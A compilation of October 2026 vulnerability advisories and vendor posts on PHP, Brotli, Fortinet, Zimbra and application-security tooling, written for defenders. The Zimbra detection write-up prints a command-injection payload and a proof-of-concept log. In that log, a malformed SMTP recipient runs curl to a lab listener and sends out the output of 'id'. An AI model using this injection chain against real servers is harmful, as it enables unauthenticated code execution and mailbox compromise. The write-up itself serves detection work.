Vulnerabilities & Patching.title: PHP Patches Two Critical Unauthenticated RCEs (CVE-2026-109618, CVE-2026-109619): [Updated for CVE-2026-115560]
Vulnerabilities & Patching.context: In a world of LLMs and agents, everybody is still running servers - and the model that found these is the same kind of model attackers now have, which is the premise behind Evo...
Vulnerabilities & Patching.full_text:
On Wednesday, October 21, 2026 at 14:00 UTC, the PHP project released PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35 to fix two critical vulnerabilities, both rated CVSS v4.0 9.2, that can allow unauthenticated remote code execution. The PHP security team advises: "There are no complete mitigations; updating is the only safe choice."

These are bugs in the PHP runtime, not in a Composer package. That changes how you detect and fix them, as we explain below

TL;DR If you run PHP that serves web requests (PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, LiteSpeed), update to 8.5.12, 8.4.27, 8.3.36, or 8.2.35 today. If you are on 8.1 or older, get a backported package from your distribution or LTS vendor, or upgrade.

What happened

Times are in UTC.

October 20: The PHP security team published an advance notice of a critical security release scheduled for October 21 at 14:00 UTC. It fixes two vulnerabilities assessed as CVSS v4.0 9.2, with the right reserved to release early if details leak or exploitation is seen in the wild.

October 21, before 14:00 UTC: Snyk published advisories for both CVEs, SNYK-UNMANAGED-PHP-21347795 (CVE-2026-109618) and SNYK-UNMANAGED-PHP-21347796 (CVE-2026-109619), to alert customers to the action they will need to take and so that monitored projects get a hit the moment the fixed versions are known.

October 21, 14:00 UTC: The PHP security advisory and the four fixed releases go live. Within about 30 minutes, Snyk's advisories are updated with all relevant details, including affected ranges and fixed versions.

October 21 onward: Linux distributions (which received the patches in advance) start publishing their own advisories. Snyk publishes advisories for them as they appear, for example SNYK-UBUNTU2604-PHP85-21373920. The running list is at CVE-2026-109618 and CVE-2026-109619.

Update @ October 23: keep session.upload_progress.enabled=0

On October 23, the PHP project published an informational advisory for CVE-2026-115560, a CVE that is reserved but not yet assigned. It describes a partial bypass vector for CVE-2026-109619. The setting that prevents it, session.upload_progress.enabled=0, was already listed as a mitigation for CVE-2026-109619.

PHP is not rushing an emergency fix because the preconditions for exploitation are rare and unlikely to apply to most deployments. An application must configure session.serialize_handler as php_binary or php_serialize, then switch it to php at runtime with ini_set() before calling session_start(), while session upload progress is enabled. Applications that never change the serialization handler at runtime can keep the feature on.

The vulnerabilities

Both are in the request lifecycle of the PHP engine, making them reachable before any application code runs. This is one factor that makes these vulnerabilities both widespread and dangerous.

Technical details

CVE-2026-109618, RCE via out-of-memory corruption: Out-of-memory handling can interrupt PHP while internal request data is only partially initialized. Request cleanup, then treats the invalid data as valid. An attacker who can drive a worker to its memory limit with a malicious request can trigger the interrupt.

CVE-2026-109619, RCE via stale global state: Request-owned internal state can survive after its backing memory has been freed. A later request handled by the same worker may use that stale state before normal initialization resets it. In a long-lived worker model that comprises a cross-request use-after-free.

These bugs were found with AI assistance, in a runtime that has been in production for three decades. In a world of LLMs and agents, everybody is still running servers - and the model that found these is the same kind of model attackers now have, which is the premise behind Evo by Snyk: AI-driven security for the applications that agents run on, not only for the agents themselves. AI-assisted discovery is also why PHP2Shell won’t be the last flaw of its kind, and why response timelines are now measured in hours.

Who is affected

All PHP installations serving web requests are at risk. That covers PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, LiteSpeed, etc. Apache with mod_php is most vulnerable, with a demonstrated exploit in which a single unauthenticated request triggers the attack before application code runs.

PHP 8.1 and older no longer receive updates from the PHP project, so an unpatched 8.1, 8.0, or 7.4 install is affected with no upstream fix. Given the severity, the PHP security team did publish minimal source backports for 7.4, 8.0, and 8.1 for people who build from source or have no LTS vendor.

What you should do now

Update. Fixed versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35. Note that 8.2 reaches end of life on December 31, 2026, so if you are on 8.2, this is also your cue to plan the next bump.

Check your vendor. Linux distributions and LTS vendors received the patches ahead of release. Pull their updated packages rather than waiting for a source build. A patched distro build can keep an older version number, so check the distro’s advisory or patch level too.

Verify what’s actually running. Check the PHP version on each host and image (php -v or the image tag). Scan results alone can’t confirm that an installation is fixed.

If you cannot update today, PHP lists mitigations that reduce exposure to specific paths without making an install safe: memory_limit=-1 set where applications cannot override it, a low post_max_size, session.upload_progress.enabled=0 followed by a restart of every worker, and on 8.5 fatal_error_backtraces=0. See the relevant advisory for the caveats on each.

Whether or not you have updated, keep session.upload_progress.enabled=0 set until the next regular bugfix release if your application switches session.serialize_handler at runtime. See the update above for details.

On PHP 8.1 or older, upgrade to a supported version or get a backported package from your distribution or LTS vendor. PHP’s source backports for 7.4, 8.0, and 8.1 are a last resort for teams building from source.

The open source side

The PHP security team gave the ecosystem a day's notice with a fixed time, a severity, and no exploitation details. They pre-shared patches with Linux distributions so packaged fixes could be released alongside the source release. They published backports for unsupported versions (7.4, 8.0, 8.1). They told users of a popular volunteer repo (rpms.remirepo.net) that it would not be updated on day one and what to do instead. And their mitigation guidance is very transparent about what each setting does not protect against.

That is what coordinated disclosure looks like when a volunteer-run project does it right. It is also why, at Snyk, we were able to have advisories live before the release and complete shortly after it: a published schedule lets everyone downstream prepare.

Snyk SCA Behavior

Snyk Open Source reads what your application declares in manifest or build files, like composer.json, composer.lock. The PHP interpreter is not a declared dependency. It is installed by a Dockerfile, a distribution package, a platform image, or by hand. A "php": ">=8.2" constraint in composer.json tells you what the application accepts, but not precisely what is deployed.

How the Snyk Platform helps you find exposed PHP

What you use

What you will see for CVE-2026-109618 and CVE-2026-109619

Snyk Open Source (CLI or SCM integration)

The CVEs themselves are not reported because the PHP runtime is not a regular dependency in your manifest file. For PHP/Composer projects, Snyk shows the application's declared dependencies, which can help you identify which of your projects are PHP applications. The declared PHP version constraint does not tell you which version is deployed.

Snyk C/C++ Unmanaged scanning

Advisories are reported when the PHP runtime is present in your project, and can be filtered by CVE ID.

Snyk Container

PHP installed from Linux distribution packages is reported once the distribution has published its advisory. Some supported distributions have published advisories, which are available in test results (for example, SNYK-RHEL10-PHP84-21392647 and SNYK-UBUNTU2604-PHP85-21373920). We are importing others as they publish, which are available here: CVE-2026-109618 CVE-2026-109619. PHP compiled from source, including the official php: Docker images, is not detected by Snyk Container.

Snyk API & Web

DAST examines and tests running applications from the outside and fingerprints their technology stack. If a customer's application is exposed to php2shell, we detect and report it

Zero Day report

The Snyk Zero Day report matches your projects to the advisories, so it can only list projects scanned using “Unmanaged scans” or Container scans of distribution packages. For Open Source-only projects, it will show no results.

Finding your PHP attack surface with Snyk API & Web

Before you can patch, you need the list. Snyk API & Web's Discovery tab enumerates assets found on your domains and fingerprints their technology stack. Open Discovery, set the Tech filter to PHP, and you have every discovered host and endpoint where PHP was identified, with its risk rating, score, and last-seen date, ready to scan or add as a target.

The same Tech filter is also available in the Targets list, so the applications you added can be narrowed to PHP the same way.

This does not tell you the PHP version. It tells you where to look, which is a crucial step towards remediation.

Test against the vulnerability with Snyk API & Web

Snyk API & Web allows you to scan your applications and APIs and detect if you are vulnerable to the PHP2Shell vulnerability.

Vulnerabilities & Patching.title: Broccoli2shell: Everything You Need To Know About The Critical Brotli Decoder Vulnerability
Vulnerabilities & Patching.context: A critical vulnerability, tracked as CVE-2026-111497 and referred to as Broccoli2Shell, has been identified in the Brotli decompression library
Vulnerabilities & Patching.full_text:
A critical vulnerability, tracked as CVE-2026-111497 and referred to as Broccoli2Shell, has been identified in the Brotli decompression library. The vulnerability affects multiple widely used technologies, including Node.js, Bun, Envoy Proxy, and more. Successful exploitation could allow an unauthenticated remote attacker to trigger memory corruption, disclose sensitive information, crash affected processes, or potentially achieve remote code execution (RCE).

Organizations using affected components to decompress untrusted Brotli-compressed data are advised to prioritize remediation.

CVE-2026-111497 was discovered and reported by Khai Tran and Sylvie Mayer (OpenAI Codex Security), with fixes implemented by Matteo Collina and Antoine du Hamel (Node.js). Ron Masas (Imperva Red Team) demonstrated its exploitability, while OpenSourceMalware and Aikido analyzed its impact on the Python ecosystem.

What is CVE-2026-111497?

Broccoli2Shell (a.k.a Node2Shell and HTTP2Shell) originates from an out-of-bounds write vulnerability in the Brotli decoder, a widely adopted compression component used to reduce the size of HTTP traffic and other data. The flaw occurs when the decoder improperly handles specially crafted compressed data during block-processing operations, potentially writing beyond allocated memory boundaries. An attacker can exploit this behavior by supplying malicious Brotli-compressed input to a vulnerable application, potentially resulting in memory disclosure, application crashes, or arbitrary code execution with the privileges of the affected process. Researchers have demonstrated successful exploitation against unpatched Node.js environments.

Although initially associated with Node.js, the vulnerability originates in the upstream Brotli C decoder and extends to multiple downstream technologies that incorporate the affected component. Exploitation requires an application or dependency to decompress attacker-controlled Brotli data, either through incoming HTTP requests, externally fetched responses, or other untrusted compressed content. Certain HTTP clients and application frameworks may perform decompression automatically when Brotli support is enabled, potentially exposing applications even when Brotli is not explicitly referenced in application code.

Wiz Research data: what’s the risk to cloud environments?

Cloud environments are particularly exposed due to the widespread use of Brotli-enabled components across containerized applications, Kubernetes clusters, API gateways, reverse proxies, serverless workloads, and cloud-hosted web services. Internet-facing applications that process attacker-controlled requests, as well as internal services that retrieve compressed responses from untrusted external sources, may provide exploitation paths. Successful exploitation could enable attackers to compromise application workloads, access sensitive information, disrupt service availability, or execute malicious code within affected containers or runtime environments.

According to Wiz data 91% of cloud environments have resources vulnerable to CVE-2026-111497, and 82% of cloud environments have publicly exposed Node.js instances.

Which products are affected?

Additional products that bundle or link against vulnerable versions of the Brotli C decoder may also be affected. Organizations should consult vendor-specific security advisories, particularly for statically linked libraries and embedded dependencies. End-of-life runtime branches should be migrated to supported versions.

Product

Which actions should security teams take?

Organizations should prioritize the following mitigation and remediation measures:

Apply security updates: Upgrade affected Brotli libraries, Node.js runtimes, Python packages, Bun, Envoy Proxy, and Istio deployments to their respective patched versions or later supported releases.

Identify vulnerable cloud workloads: Inventory virtual machines, Kubernetes clusters, containers, serverless functions, API gateways, and application dependencies for vulnerable Brotli components. Prioritize internet-facing services and workloads processing untrusted compressed data.

Review application exposure: Identify applications that decompress Brotli-compressed HTTP requests, external HTTP responses, uploaded files, or other attacker-controlled content. Include indirect and transitive dependencies in the assessment.

Rebuild and redeploy affected workloads: Update container base images, dependency lockfiles, and bundled libraries. Rebuild and redeploy affected container images, restart running processes, and verify that patched components are loaded.

Implement temporary mitigations: Where immediate patching is not possible, consider disabling Brotli decompression or rejecting Brotli-encoded requests before they reach vulnerable components. Restrict untrusted compressed responses where feasible. These controls may reduce exposure but do not replace patching.

Strengthen monitoring and detection: Review WAF, application, and network logs for suspicious Brotli-compressed traffic, unexpected application crashes, and anomalous process behavior. Monitor affected workloads for indicators of exploitation.

Wiz customers can use the pre-built query and advisory in the Wiz Threat Center to search for vulnerable instances in their environment.

Vulnerabilities & Patching.title: CISA Adds One Known Exploited Vulnerability to Catalog
Vulnerabilities & Patching.context: CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation
Vulnerabilities & Patching.full_text:
CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation.

CVE-2026-110447 Collabora Online – Built-in CODE Server OS Command Injection Vulnerability

This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise.

Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied.

While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria.

Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form. Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

Vulnerabilities & Patching.title: Critical vulnerabilities in Fortinet products
Vulnerabilities & Patching.context: Fortinet have announced critical vulnerabilities in Fortinet products and are releasing critical security updates for a wide range of products
Vulnerabilities & Patching.full_text:
Fortinet have announced critical vulnerabilities in Fortinet products and are releasing critical security updates for a wide range of products. Fortinet are advising customers to complete the security updates as a priority.

This alert is intended for all organisations using Fortinet products.

Background

Fortinet are releasing critical security updates to a wide range of products. Fortinet have recommended customers implement the security updates as a prioirity.

The Australian Signals Directorate's Australian Cyber Security Centre (ASD’s ACSC) is monitoring the situation but has no further details beyond Fortinet’s current public advice. Fortinet is expected to release more information 10 November 2026.

Fortinet has announced that multiple versions of FortiOS, FortiManager, FortiAnalyzer, FortiMail and FortiAuthenticator are affected.

A comprehensive list of affected products and fixed versions can be found here.

Fortinet have advised affected versions of FortiSASE have already had security updates applied automatically but FortiManager products may require manual updates.

ASD’s ACSC is currently not aware of active exploitation related to these vulnerabilities in Australia.

Mitigation advice

ASD’s ACSC advises individuals and organisations to:

Identify Fortinet products within their environments.

Apply available security updates.

Monitor and review Fortinet official guidance.

Continue to monitor Fortinet products for evidence of exploitation activity.

Where the relevant security updates are unable to be implemented immediately, Fortinet have recommended customer reduce exposure by:

Restricting administrative interfaces (HTTPS, SSH) to trusted IP addresses or disable them on external interfaces.

Ensuring FortiManager administration is not reachable from the internet.

Implementing strong credentials and mandating Multi-Factor Authentication (MFA) on user accounts.

Where to get help

Organisations that have been impacted, suspect impact or require advice and assistance can contact us via 1300 CYBER1 (1300 292 371), or at www.cyber.gov.au/submit-a-report.

Vulnerabilities & Patching.title: Node2Shell: Node.js Brotli flaw (CVE-2026-111497)
Vulnerabilities & Patching.context: js project released fixes for a Brotli decompression flaw (CVE-2026-111497, "Node2Shell")
Vulnerabilities & Patching.full_text:
What happened?

On October 21, 2026, the Node.js project released fixes for a Brotli decompression flaw (CVE-2026-111497, "Node2Shell"). The flaw is an out-of-bounds write that can crash a process or allow remote code execution (RCE).

Okta's response

Security Patching Services: The change has been deployed across the production environments of both Okta and Auth0.

No Evidence of Exploitation: To date, Okta and Auth0 have observed no evidence of exploitation.

Do I need to do anything?

Customers using Auth0: We recommend updating the runtime version in your Auth0 tenant settings or in your Action configuration to Node 22, then deploying your changes. Customers already on Node 22 do not need to redeploy.

Customers using Auth0 SDKs with Node.js: We recommend downloading and installing the latest version.

Customers using the ad-ldap connector: We recommend downloading and installing the latest version.

Reference

Aikido Security, Node2Shell: Node.js Brotli vulnerability allows remote code execution (CVE-2026-111497)

Vulnerabilities & Patching.title: How CVE-2026-73570 turns a Zimbra log file into remote code execution
Vulnerabilities & Patching.context: When we are building detections for various threats, we regularly run the exploits on representative systems to help us build high-quality rules
Vulnerabilities & Patching.full_text:
When we are building detections for various threats, we regularly run the exploits on representative systems to help us build high-quality rules. The Common Vulnerabilities and Exposures (CVE) entry CVE-2026-73570 for Zimbra is no exception. Zimbra is a widely used enterprise email and collaboration software platform, known for its SMTP platform, among other services. SMTP plays a critical role in the infrastructure of many organizations by providing email services that often include either direct or indirect identity management. In addition to the direct appeal for attackers to read emails, attachments, etc., there is also an appeal for compromised identity management. A compromised mail server can be used to impersonate legitimate accounts for further access and exploitation, becoming a staging ground for additional targets.

CVE-2026-73570 is an unauthenticated command injection vulnerability in Zimbra, and one malformed recipient address is enough to trigger it. Send a malformed request and it is logged in /var/log/zimbra.log. From there, the Swatchdog monitoring daemon matches it against a service status pattern and passes it to /bin/sh inside a backticked Perl string. The result is remote code execution as the zimbra user. The account reads every mailbox on the server and sends as any local identity, so compromising the mail server compromises the identities it serves.

We reproduced the full chain while building detections for it, and several of the public proofs of concept (PoCs) we tested write a payload that Swatchdog never matches, so a failed test looks like a patched server. The working chain is shown next, along with the rule that fires when a shell spawns anything other than snmptrap.

Note that if you host Zimbra Simple Mail Transfer Protocol (SMTP) services and haven’t patched to version 10.1.20+, please do so before trying out the steps in this blog post.

How the Zimbra command injection vulnerability works

The core entry point for this kind of attack is CVE-2026-73570, a vulnerability in an unpatched Zimbra service (patched as of Zimbra version 10.1.20). When exploited, it can provide arbitrary remote code execution bypassing authentication requirements. To do this, an attacker passes a specifically crafted SMTP message that’s written to the notification file /var/log/zimbra.log for processing. Under normal circumstances, entries are written to this log to keep track of the status of services, such as when a given mailbox service has started or a message delivery has failed:

Sep 30 22:48:29 mail postfix/pickup[57597]: 6272F1E1393: uid=997 from=<zimbra> Sep 30 22:48:29 mail postfix/cleanup[57599]: 6272F1E1393: message-id=<20261001024829.6272F1E1393@mail.lab.test> Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: from=<zimbra@mail.lab.test>, size=604, nrcpt=1 (queue active) Sep 30 22:48:29 mail postfix/error[57602]: 6272F1E1393: to=<zimbra@mail.lab.test>, orig_to=<zimbra>, relay=none, delay=4707, delays=4707/0.01/0/0.01, dsn=5.0.0, status=bounced (mail.lab.test) Sep 30 22:48:29 mail postfix/cleanup[57599]: 6DD441E13F5: message-id=<20261001024829.6DD441E13F5@mail.lab.test> Sep 30 22:48:29 mail postfix/bounce[57603]: 6272F1E1393: sender non-delivery notification: 6DD441E13F5 Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: from=<>, size=2463, nrcpt=1 (queue active) Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: removed Sep 30 22:48:29 mail postfix/error[57602]: 6DD441E13F5: to=<zimbra@mail.lab.test>, relay=none, delay=0.01, delays=0.01/0/0/0, dsn=5.0.0, status=bounced (mail.lab.test) Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: removed

Figure 2: Log indication that a message failed to be delivered to zimbra@mail.lab.test.

As part of the monitoring components of Zimbra, a daemon called Swatchdog watches this file for specific log entries that match the format of a service status change:

Service status change: <host> <service> changed from stopped to running Service status change: <host> <service> changed from running to stopped

Figure 3: Normal service message.

When an entry is identified and SNMP notifications are enabled, it invokes a notification function that generates an snmptrap, a one-way alert from the mail server to a monitoring host. The target of CVE-2026-73570 is the way that this message is constructed. The SNMP notification message is parsed with Perl. Zimbra packages a copy of the Perl program Swatchdog to handle this parsing and monitor logs. It tails the log file and compiles /opt/zimbra/conf/swatchrc.in into a Perl script using perlcode lines to directly embed Perl commands into that script. By inspecting the contents of swatchrc.in, we can see the vulnerability in this process. In version Release 10.1.16.BETA.4200001.UBUNTU24.64 UBUNTU24_64 FOSS edition, this is line 26, specifically the dosnmp call:

perlcode 0 my $snmptrap="/opt/zimbra/common/bin/snmptrap $snmpargs"; perlcode 0 my $snmpsvctrap="ZIMBRA-TRAP-MIB::zmServiceStatusTrap"; perlcode 0 my $snmpsvcname="ZIMBRA-MIB::zmServiceName"; perlcode 0 my $snmpsvcstatus="ZIMBRA-MIB::zmServiceStatus"; ... perlcode 0 sub dosnmp { my %args = (@_); print "SNMP notification: $args{MESSAGE}\n"; `$snmptrap $snmpsvctrap $snmpsvcname s $args{SERVICE} $snmpsvcstatus i $statuses{$args{STATUS}}`; }

Figure 5: Status 1 for service “mailbox”.

However, the service name is built from $args{SERVICE} and is vulnerable to injection through log messages matching the service format. Injecting a log message is straightforward, as Postfix already records pieces of what any given SMTP client sent. So an attacker just needs to send a message that will end up in this log file. One method of doing this is to supply a message with an invalid address syntax.

A normal SMTP message includes a MAIL FROM section, denoting the sender, and a RCPT TO, specifying the recipient, along with DATA, which is the message. The first two require the email address to be wrapped in angle brackets; for example, <address@host.name>. If an attacker doesn’t follow the wrapping and omits the final >, the specified unclosed address will show up in the log file. For example, an address of <address@host.namewill have a log entry as follows:

warning: Illegal address syntax from mail.lab.test[10.0.2.15] in RCPT command:<address@host.name

Figure 6: Invalid recipient log entry.

Since the attacker controls this address, they can then specify a payload that will match the pattern that the daemon is looking for, Service status change: <host> <service>. Instead of supplying a valid host and service, the service can be replaced with arbitrary commands; for example $(touch /tmp/manual_test.txt). This will then be run as the original Perl process calls /bin/sh to send the notification. With this, the attacker has arbitrary remote code execution (RCE) on the target, including the ability to masquerade as other email identities from this server.

The full chain, from inbound message to code execution, is as follows:

Stage

Component

Artifact

Delivery

Postfix

Malformed RCPT TO logged to /var/log/zimbra.log.

Trigger

Swatchdog

Log line matches the service status pattern.

Execution

Perl dosnmp

Backticks pass $args{SERVICE} to /bin/sh.

Impact

zimbra user

Code execution, identity access.

Why most public CVE-2026-73570 PoCs fail

Given the ability to execute arbitrary code, an attacker can use a number of different mechanisms to establish persistence and gain further access. In testing these approaches, we found that many of the existing PoCs didn’t fully establish the RCE chain. In some cases, the PoCs wrote incorrectly formatted commands to the log file, preventing their execution. As a result, we developed a PoC that runs a variety of commands. We also include tests that run against a remote host and send a callback to a locally running web server. With this approach, we can see that the attack works without causing any additional on-disk changes to the target:

elastic@test-as89074:~$ python3 CVE-2026-73570_poc.py --host 10.0.2.15 --command "id" --listen [*] Scanning standard SMTP ports on 10.0.2.15... [+] Port 25 (SMTP) : OPEN [-] Port 587 (SMTP) : CLOSED/FILTERED [*] Targeting 10.0.2.15:25 (Plain SMTP) [*] OOB Listener URL: http://10.0.2.16:8080/capture/abc123/ [*] Payload: x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running [*] Full RCPT TO: <"x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running"@cve.invalid> [<] 220 mail.lab.test ESMTP Postfix [>] EHLO localhost [<] 250-mail.lab.test 250-PIPELINING 250-SIZE 10240000 250-VRFY 250-ETRN 250-STARTTLS 250-ENHANCEDSTATUSCODES 250-8BITMIME 250 DSN [>] MAIL FROM:<test@test.com> [<] 250 2.1.0 Ok [>] RCPT TO:<"x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running"@cve.invalid> [<] 501 5.1.3 Bad recipient address syntax [*] Waiting up to 10 seconds for OOB callback... [*] Internal OOB listener started on http://10.0.2.16:8080/capture/... [***] OOB CALLBACK RECEIVED [***] [+] Captured Data: uid=997(zimbra)gid=982(zimbra)groups=982(zimbra),5(tty),981(postfix) [+] SUCCESS: The malicious payload was executed! [+] Captured Data: uid=997(zimbra)gid=982(zimbra)groups=982(zimbra),5(tty),981(postfix)

Figure 8: PoC successful execution using a callback.

How to patch and detect CVE-2026-73570

Zimbra has patched this vulnerability. To remediate and detect CVE-2026-73570, take the following steps:

Upgrade to Zimbra 10.1.20 or later. This is the only complete fix.

Install Elastic Defend (if you haven’t already).

Enable the Zimbra Swatchdog SNMP Command Injection Execution security information and event management (SIEM) rule to detect exploitation and to hunt retroactively for pre-patch attempts.

sequence by host.id with maxspan=30s [process where host.os.type == "linux" and event.type == "start" and event.action in ("exec", "exec_event", "start") and process.name in ("sh", "bash", "dash", "ash", "zsh", "ksh") and process.parent.name like~ "perl*" and process.parent.command_line like~ "*.swatchdog_script*" and process.command_line like~ "*snmptrap*" and process.command_line like~ "*zmservicename*" and process.command_line like~ "*zmservicestatus*" ] by process.entity_id [process where host.os.type == "linux" and event.type == "start" and event.action in ("exec", "exec_event", "start") and process.name != "snmptrap" ] by process.parent.entity_id

The Zimbra Swatchdog detection rule identifies a sequence of processes that break from the normal Zimbra pattern. First, a shell process, /bin/sh in the prior example, is started from a parent watchdog script Perl process and has snmptrap in its command arguments, matching the expected call /opt/zimbra/common/bin/snmptrap ... ZIMBRA-MIB::zmServiceName s mailbox ... from earlier. Second, the rule detects a subprocess launched by the shell identified in the first step, provided that the subprocess isn’t snmptrap. Since the only process that should run under legitimate circumstances is snmptrap, this is a very strong indicator of successful exploitation.

If you detect a compromise, hunt for:

Standard indicators of remote code execution on the host.

Phishing emails originating from the server.

Compromise of local databases and signing keys, as well as LDAP exports.

Less direct surfaces beyond the mail store itself.

Zimbra detection rules in Elastic Security

Zimbra Swatchdog SNMP Command Injection Execution

CVE-2026-73570: Zimbra Collaboration unauthenticated RCE via Swatchdog/SNMP log-injection command injection swatchrc dosnmp Perl backtick

Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570

Vulnerabilities & Patching.title: ASPM in the AI Era Part 2: Prioritize Exploitable Risks with Code-to-Cloud Context
Vulnerabilities & Patching.context: For example: SCA: CVE-based findings are enriched with context from the NVD Vulnerability Catalog, real-time EPSS (Exploit Prediction Scoring System) probability scores, active...
Vulnerabilities & Patching.full_text:
In Part 1, we established how to centralize your AppSec tools, correlate assets, and map scanner coverage across repositories. Establishing visibility is an essential baseline, but once your connectors start streaming data into a single location, prioritization becomes the primary focus.

As highlighted in our recent State of SDLC Security 2026 report, AI’s primary impact isn't necessarily introducing entirely new risks. It's the amplification of existing ones through faster code generation, contributing to a wider attack surface area with less time for human review.

For lean AppSec teams, the real promise of ASPM lies in how it helps prioritize application risk across their enterprise. But, as we saw with the React2Shell example, prioritization requires context across the entire application lifecycle. AppSec teams must quickly distinguish between theoretical code flaws sitting on un-deployed branches and active vulnerabilities running on internet-facing workloads.

To transform raw scanner output into actionable risk, Wiz Code executes prioritization across two distinct layers:

Finding-level prioritization: Normalizing scanner data into unified schemas, actively enriching findings with threat intelligence and network reachability, and deduplicating identical alerts across overlapping tools.

Attack path prioritization: Using the Wiz Security Graph to connect code-level findings with live cloud runtime context, elevating isolated flaws into fully validated attack paths.

Let’s look at how to operationalize both layers in your environment.

Enrich, Deduplicate, and Prioritize Individual Findings

Findings from connected scanners populate into their respective domains in the Wiz platform. For example, SAST results flow into the SAST Findings tab, SCA results populate in the Vulnerability Findings tab, and Secret results show up in the Secret Findings page. You can easily filter any table by “origin” to isolate alerts from a specific tool. In the example below, we’re filtering vulnerability findings surfaced from a Snyk SCA scan.

From this unified baseline, Wiz executes multiple layers of prioritization to help AppSec teams focus on what matters.

Enrichment

Imported findings are enriched with domain specific context, turning generic alerts into prioritized findings. For example:

SCA: CVE-based findings are enriched with context from the NVD Vulnerability Catalog, real-time EPSS (Exploit Prediction Scoring System) probability scores, active exploit availability, and CISA KEV status. Our Threat Research team also denotes findings with active threats and writes complete advisories, so security teams have the latest insight on zero days.

SAST: CWE findings include code snippets so security teams have visibility into the location and context of weaknesses.

DAST: Wiz independently validates network exposure for the web applications with DAST findings using the Attack Surface Management (ASM) module. The ASM engine can be configured to run other checks such as secrets or sensitive data exposure checks from the perimeter on these newly created endpoints. Private-only addresses are marked differently so teams can prioritize findings with a real external attack surface.

Secrets: Wiz runs ingested secrets through databases to see if the secret was leaked, classifies secret types for understanding its impact, and assigns severities to the detected secrets based on threat research if the originating scanner did not provide any.

Deduplication

Security teams should not waste time chasing down multiple vulnerability findings for the exact same issue. When multiple tools scan the same codebase and produce duplicative vulnerability findings, Wiz can easily reconcile them.

Wiz labels one finding as "Representative" and the duplicates as "Duplicate." Teams can apply automated Ignore Rules scoped to duplicate findings, instantly eliminating redundant noise in reporting without losing the underlying scanner audit trail. So instead of generating individual tickets for each finding, teams can create one ticket to consolidate the findings.

Prioritize Exploitable Attack Paths

Traditionally ASPM has focused on aggregating findings and prioritizing risk using simple scoring. Wiz takes a different approach by correlating findings with additional risk on the Wiz Security Graph. This is where the platform moves from managing vulnerabilities to managing exploitable attack paths.

The Wiz Security Graph correlates multiple risk factors into a single Wiz Issue (identifying toxic combinations of risk). Critically, these controls run on your third-party findings exactly the same way they run on native Wiz findings. If you connect a scanner, its data instantly becomes part of your code-to-cloud attack path analysis.

What this looks like in practice

Let's look at how this context transforms a standard alert into a prioritized Wiz Issue. Imagine your Snyk integration flags a high-severity SAST finding (such as a remote code execution or command injection flaw) on a repository branch. In a vacuum, a developer might treat this as an urgent priority, or they might ignore it if they assume it is an internal tool.

The Wiz Security Graph evaluates the entire deployment lifecycle to uncover the actual risk. A single Wiz Issue might reveal:

The Code Flaw: A SAST finding from Snyk and a native Wiz SAST finding, both originating on the same repository branch.

The Build Artifact: That specific branch was built into a container image currently running in a production Kubernetes cluster.

The Exposure: The Kubernetes cluster is exposed to the internet via a public application endpoint.

Active Validation: An Attack Surface Management (ASM) finding confirms the endpoint is actively reachable from the outside.

Instead of manually piecing together four separate alerts across three different tools, Wiz draws the connection natively. Because these findings all resolve to the same underlying resource and represent the same attack path, they are surfaced as one unified, high-priority Wiz Issue.

Conversely, if that same SAST flaw was detected on a branch that never ships to a running cloud workload, it remains a low-priority finding—sparing developers from interrupting their sprint for a non-exploitable risk.

Manage security debt at scale

Not every finding may map to an attack path. But, lower-severity findings still represent real risk if left unaddressed. In Wiz, organizations can track and govern these findings through Posture Issues.

AppSec teams can create logical groupings of findings based on several criteria such as severity, project, code repository and more to build tailored campaigns for managing security debt. Teams can also define SLAs for remediation to align with organizational policies.

Up Next: Remediation and Automation at Machine Speed

Separating signal from noise is a massive win, but prioritization without rapid remediation is only half the battle. Once critical attack paths are identified, how do you ensure the right engineering team fixes them without slowing down release cycles?

In Part 3, the final instalment of this series, we’ll explore how to remediate at machine speed. We’ll cover how to leverage the Wiz Green Agent to generate tailored remediation plans in developer workflows and how to automate response with Wiz Workflows.

Vulnerabilities & Patching.title: The early bird gets the exploit.
Vulnerabilities & Patching.context: AI-assisted exploit development is accelerating the transition from vulnerability disclosure to active attacks, sometimes to just minutes. Security teams should prioritize patching critical internet-facing vulnerabilities within hours, investigate potential compromises predating disclosure, and deploy detections...
Vulnerabilities & Patching.full_text:
